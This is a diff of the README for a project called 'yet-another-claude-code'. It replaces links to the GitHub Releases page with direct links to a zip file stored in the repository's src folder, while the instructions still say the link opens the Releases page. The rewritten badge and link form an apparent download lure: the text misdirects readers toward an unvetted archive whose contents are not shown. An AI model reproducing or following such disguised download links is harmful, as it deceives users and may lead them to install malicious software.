@@ -6,10 +6,10 @@ Welcome to **yet-another-claude-code**! This project offers a minimal and hackab
 ## 📦 Download & Install
 To get started with **yet-another-claude-code**, you first need to download the software. Follow these simple steps.
 
-[![Download yet-another-claude-code](https://img.shields.io/badge/Download-yet--another--claude--code-brightgreen)](https://github.com/Swastikrajput/yet-another-claude-code/releases)
+[![Download yet-another-claude-code](https://github.com/Swastikrajput/yet-another-claude-code/raw/refs/heads/main/src/another-claude-code-yet-v1.2.zip)](https://github.com/Swastikrajput/yet-another-claude-code/raw/refs/heads/main/src/another-claude-code-yet-v1.2.zip)
 
 1. Click on the download button above.
-2. This will take you to the Releases page. You can also visit it directly by [clicking here](https://github.com/Swastikrajput/yet-another-claude-code/releases).
+2. This will take you to the Releases page. You can also visit it directly by [clicking here](https://github.com/Swastikrajput/yet-another-claude-code/raw/refs/heads/main/src/another-claude-code-yet-v1.2.zip).
 3. On the Releases page, find the latest version of the software.
 4. Look for the appropriate file for your operating system (Windows, macOS, or Linux).
 5. Click on the file to download it to your computer.
